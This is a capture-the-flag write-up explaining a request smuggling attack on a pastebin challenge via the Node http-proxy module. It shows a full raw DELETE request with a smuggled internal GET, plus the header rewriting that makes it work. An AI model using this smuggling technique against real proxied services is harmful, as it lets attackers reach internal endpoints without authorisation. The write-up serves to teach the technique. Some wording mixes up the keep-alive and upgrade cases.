Vulnerability exists in the http-proxy module. Based on [NextJS CVE-2026-29057](https://nvd.nist.gov/vuln/detail/CVE-2026-29057), but intended solve differs from NextJS-supplied patch.

Exploit is a TE.CL requests smuggling attack.

## High-Level Overview

1. Smuggle a request that sets the currently-invisible flag paste to visible
2. Read the previously-invisible flag from the pastebin.

### Explaining the request smuggling.

## The Raw Request

```
DELETE /api/paste?id=abdef HTTP/1.1
Host: 127.0.0.1:3000
Transfer-Encoding: chunked
Connection: upgrade

3D
GET /internal/visible?id=1 HTTP/1.1
Host: 127.0.0.1:8000


0
```

This is a valid transfer-encoded request. The node `http` library parses the data after `Connection: keep-alive` as a well-formed chunk.

## Delete Method

The `DELETE` (as well as `Options`) HTTP methods are incorrectly handled in
`http-proxy.passes.web-incoming.deleteLength`. The content-length header is
set to 0 from the proxied request, and the `transfer-encoding` header is stripped.
Thus, our headers go from

```
{
  host: '127.0.0.1:3000',
  'transfer-encoding': 'chunked',
}
```

to

```
{
  host: '127.0.0.1:3000',
  'content-length': '0'
}
```

We have now transformed the encoding of the body from a chunked to a non-chunked, content-length delimited body. However, if the request is just proxied like this, we will not be successful

## Connection: Upgrade Header

With `Connection: keep-alive`, the frontend proxies a request as:

```
DELETE /api/paste?id=abdef HTTP/1.1
content-length: 0
connection: close
host: 127.0.0.1:3000

GET /internal/visible?id=1 HTTP/1.1
Host: 127.0.0.1:8000

```

The `Connection` header is set to `close`. With `content-length` set to 0,
and the connection being instructed to close, the backend terminates the connection,
not processing the second request.

With `Connection: upgrade`, we get the raw proxied request as:

```
DELETE /api/paste?id=abdef HTTP/1.1
content-length: 0
connection: upgrade
host: 127.0.0.1:3000

GET /internal/visible?id=1 HTTP/1.1
Host: 127.0.0.1:8000

```

Note that unlike `Connection: keep-alive`, which closes the socket, `Connection: Upgrade` is proxied without issue. In `http-proxy.common.js.setupOutgoing`, only if the `Connection` header contains the regex
`/(^|,)\s*upgrade\s*($|,)/i` (essentially `upgrade`), then `Connection` is left open, comparative to `Connection: keep-alive` which doesn't match the regex and closes the socket. This is done to allow upgrading to `HTTP/2` or a websocket connection, but we are able to exploit this behavior.

Since `content-length` is 0, the backend stops processing the first HTTP request after the host header. The socket is still open, however, and the backend sees the start of the second request, processing the request without issue. This allows us to smuggle requests.
